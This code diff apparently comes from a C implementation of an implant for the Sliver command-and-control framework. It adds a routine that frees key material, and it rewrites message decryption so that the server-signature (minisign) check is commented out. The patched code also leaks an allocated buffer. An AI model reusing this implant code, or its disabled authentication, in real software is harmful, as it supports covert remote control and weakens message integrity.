@@ -47,6 +47,36 @@ PSLIVER_THREADPOOL InitializeSliverThreadPool(void)
 	return pResult;
 }
 
+VOID FreeGlobalConfig
+(
+	_In_ PGLOBAL_CONFIG pConfig
+)
+{
+	if (pConfig != NULL) {
+		if (pConfig->pSessionKey != NULL) {
+			FREE(pConfig->pSessionKey);
+		}
+
+		if (pConfig->lpRecipientPubKey != NULL) {
+			FREE(pConfig->lpRecipientPubKey);
+		}
+
+		if (pConfig->lpPeerPubKey != NULL) {
+			FREE(pConfig->lpPeerPubKey);
+		}
+
+		if (pConfig->lpPeerPrivKey != NULL) {
+			FREE(pConfig->lpPeerPrivKey);
+		}
+
+		if (pConfig->lpServerMinisignPublicKey != NULL) {
+			FREE(pConfig->lpServerMinisignPublicKey);
+		}
+
+		FREE(pConfig);
+	}
+}
+
 PBUFFER RegisterSliver
 (
 	_In_ PGLOBAL_CONFIG pConfig
@@ -374,9 +404,9 @@ PBUFFER SliverDecrypt
 	PBYTE pTemp = NULL;
 	PBYTE pNonce = NULL;
 	DWORD cbCipherText = 0;
-	DWORD cbPlainText = 0;
+	BOOL IsOk = FALSE;
 
-	if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
+	/*if (pCipherText->cbBuffer < MINISIGN_SIZE + 1) {
 		goto CLEANUP;
 	}
 
@@ -390,18 +420,25 @@ PBUFFER SliverDecrypt
 		goto CLEANUP;
 	}
 
-	pNonce = pTemp + MINISIGN_SIZE;
+	pNonce = pTemp + MINISIGN_SIZE;*/
+	pTemp = pCipherText->pBuffer;
+	pNonce = pTemp;
 	pTemp = pNonce + CHACHA20_NONCE_SIZE;
-	cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
+	//cbCipherText = pCipherText->cbBuffer - MINISIGN_SIZE - CHACHA20_NONCE_SIZE;
+	cbCipherText = pCipherText->cbBuffer - CHACHA20_NONCE_SIZE;
 	pResult = ALLOC(sizeof(BUFFER));
 	pResult->pBuffer = ALLOC(cbCipherText);
-	pResult = Chacha20Poly1305DecryptAndVerify(pConfig->pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0, &cbPlainText);
-	if (pResult == NULL || cbPlainText == 0) {
+	pResult = Chacha20Poly1305DecryptAndVerify(pConfig->pSessionKey, pNonce, pTemp, cbCipherText, NULL, 0);
+	if (pResult->pBuffer == NULL || pResult->cbBuffer == 0) {
 		goto CLEANUP;
 	}
 
-	pResult->cbBuffer = cbPlainText;
+	IsOk = TRUE;
 CLEANUP:
+	if (!IsOk) {
+		FreeBuffer(pResult);
+	}
+
 	if (pDecodedPubKey != NULL) {
 		FREE(pDecodedPubKey);
 	}
